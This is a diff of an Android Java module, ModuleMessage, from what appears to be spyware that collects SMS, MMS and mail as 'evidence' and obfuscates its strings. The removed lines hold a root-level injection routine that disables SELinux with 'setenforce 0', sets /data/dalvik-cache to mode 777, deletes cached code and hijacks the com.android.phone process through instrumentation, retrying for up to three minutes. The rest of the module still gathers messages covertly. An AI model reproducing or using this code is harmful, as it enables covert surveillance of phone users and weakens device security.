@@ -71,7 +71,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private static final int ID_SMS = 1;
 	private static final int ID_MMS = 2;
 	private static final int MAIL_PROGRAM = 2;
-	private static String messageStorage = null;
+
 	private boolean mailEnabled;
 	private boolean smsEnabled;
 	private boolean mmsEnabled;
@@ -88,8 +88,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private int lastSMS;
 	private Filter[] filterCollect = new Filter[3];
 	private Filter[] filterRuntime = new Filter[3];
-	private static Instrument hijack = null;
-	private static String MESSAGE_STORE = "m4/";
+
 
 	// private SmsHandler smsHandler;
 
@@ -251,48 +250,9 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			msgHandler = new MsgHandler(smsEnabled, mmsEnabled);
 			msgHandler.start();
 		}
-		if( Status.haveRoot() && (hijack==null || !hijack.isStarted()) ) {
-			Date start = new Date();
-			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
-			while(diff_sec<180) {
-				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
-				if(startInjection()){
-					break;
-				}
-				Utils.sleep(5);
-			}
-		}
+
 	}
 
-	public static boolean startInjection() {
-		createMsgStorage();
-		Execute.chmod(M.e("777"), M.e("/data/dalvik-cache/"));
-		Execute.executeRoot(M.e("setenforce 0") );
-
-		Execute.executeRoot(M.e("rm /data/dalvik-cache/") + Status.getApkName().replace("/", "@") + "*");
-		if(hijack==null) {
-			hijack = new Instrument(M.e("com.android.phone"), Status.getApkName()+"@"+ Status.getAppContext().getPackageName(), M.e("irp"), Status.self().semaphoreMediaserver, M.e("pa.data"));
-			hijack.setInstrumentationSuccessDir(messageStorage);
-		}
-		if (hijack.isStarted()){
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): hijacker already running");
-			}
-			return true;
-		}
-		if (hijack.startInstrumentation()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): hijacker successfully installed");
-			}
-			EvidenceBuilder.info(M.e("Call Module ready"));
-			return true;
-		} else {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): hijacker cannot be installed");
-			}
-		}
-		return false;
-	}
 
 	@Override
 	public void actualStop() {
@@ -312,12 +272,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		if (msgHandler != null) {
 			msgHandler.quit();
 		}
-		if( Status.haveRoot()) {
-			if (hijack != null) {
-				hijack.stopInstrumentation();
 
-			}
-		}
 
 	}
 
@@ -344,13 +299,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			updateMarkupSMS(mylastSMS);
 
 		}
-		if( Status.haveRoot()) {
-			if (hijack != null ||  !hijack.isStarted()) {
-				hijack.startInstrumentation();
-			}else {
-				startInjection();
-			}
-		}
+
 	}
 
 	private void initMail() {
@@ -698,24 +647,5 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 		return lastSMS;
 	}
-	static public boolean createMsgStorage() {
-		// Create storage directory
-		messageStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + MESSAGE_STORE;
 
-		if (Path.createDirectory(messageStorage) == false) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (createMsgStorage): audio storage directory cannot be created"); //$NON-NLS-1$
-			}
-
-			return false;
-		} else {
-			Execute.chmod(M.e("777"), messageStorage);
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (createMsgStorage): audio storage directory created at " + messageStorage); //$NON-NLS-1$
-			}
-
-			return true;
-		}
-	}
 }
